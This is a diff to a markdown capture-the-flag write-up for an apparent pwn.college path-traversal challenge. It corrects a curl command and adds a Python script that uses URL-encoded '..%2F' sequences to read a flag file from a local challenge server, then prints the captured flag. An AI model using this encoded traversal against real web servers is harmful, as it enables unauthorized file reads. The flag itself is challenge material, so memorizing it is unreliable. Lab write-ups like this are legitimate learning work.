@@ -29,7 +29,7 @@ II WAY -> curl
 -clicked start
 -opened the terminal
 -ran: '/challenge/server'
--ran: 'curl -v "http://challenge.localhost/deliverables/..%2F..%2F/flag"'
+-ran: 'curl -v "http://challenge.localhost/deliverables/..%2F..%2Fflag"'
 -flag popped out
 
 III WAY -> browser
@@ -41,11 +41,29 @@ III WAY -> browser
 -url: "http://challenge.localhost:80/deliverables/..%2F..%2Fflag"
 -flag popped out
 
+IV WAY -> python
+-clicked start
+-opened the terminal
+-ran: 'vim bro'
+-typed: '#!/usr/bin/env python3'
+        'from pwn import *'
+        'import requests'
+        'context.log_level = 'error''
+        'p = process("/challenge/server")'
+        'time.sleep(1)'
+        'url = "http://challenge.localhost/deliverables/..%2F..%2Fflag"'
+        'r = requests.get(url)'
+        'print(r.text)'
+-ran: 'chmod a+x bro'
+-ran: './bro'
+-flag popped out
+
 ## 🧑🏾‍🏫 what this challenge teaches u
 how to read server's code and retrieve the correct vulnerablity to exploit
 in this case <path:path> accepts arbitrary subpaths
 app.root_path is the full path in which server's code exist
-to avoid curl or browser to execute ../ before sending the request, use url encoding: / -> %2F    ../ -> ..%2F
+to avoid curl, python and the browser to execute ../ before sending the request, use url encoding: / -> %2F    ../ -> ..%2F
+in python, to wait a sec after the process has been run use time.sleep(1)
 
 ## 🏁 Flag  
 pwn.college{kfk1hZNut7C5qzaFnlbIOkQPPDt.QX3gzMzwCO4IDOxEzW}
